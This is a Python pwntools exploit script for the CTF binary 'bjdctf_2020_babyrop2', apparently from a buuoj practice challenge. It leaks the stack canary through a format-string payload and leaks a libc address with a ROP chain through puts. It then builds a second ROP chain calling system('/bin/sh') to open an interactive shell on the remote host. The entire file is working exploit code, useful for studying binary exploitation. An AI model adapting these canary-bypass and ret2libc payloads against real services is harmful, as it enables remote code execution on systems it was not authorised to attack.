from pwn import *
from LibcSearcher import *
context(log_level='debug', arch='amd64', os='linux')

if len(sys.argv) > 1:
  conn = remote('node4.buuoj.cn', 27101)
else:
  conn = process(sys.argv[0][:-7])

elf = ELF('./bjdctf_2020_babyrop2')
puts = elf.plt['puts']
leak_func = 'puts'
leak_got = elf.got[leak_func]
pop_rdi_ret = 0x00400993
vuln = 0x00400887

conn.recvuntil(b'u!\n')
payload1 = b'aa%7$p'
conn.send(payload1)
canary = int(conn.recvline()[2:-1], 16)
conn.recvuntil(b'story!\n')
payload2 = b'a'*0x18 + p64(canary) + p64(0) + p64(pop_rdi_ret) + p64(leak_got) + p64(puts) + p64(vuln)
conn.sendline(payload2)

leak_addr = u64(conn.recv(6)+b'\x00\x00')
libc = LibcSearcher(leak_func, leak_addr)
libc_base = leak_addr - libc.dump(leak_func)
system = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')

conn.recvuntil(b'story!\n')
payload2 = b'a'*0x18 + p64(canary) + p64(0) + p64(pop_rdi_ret) + p64(binsh) + p64(system)
conn.sendline(payload2)
conn.interactive()

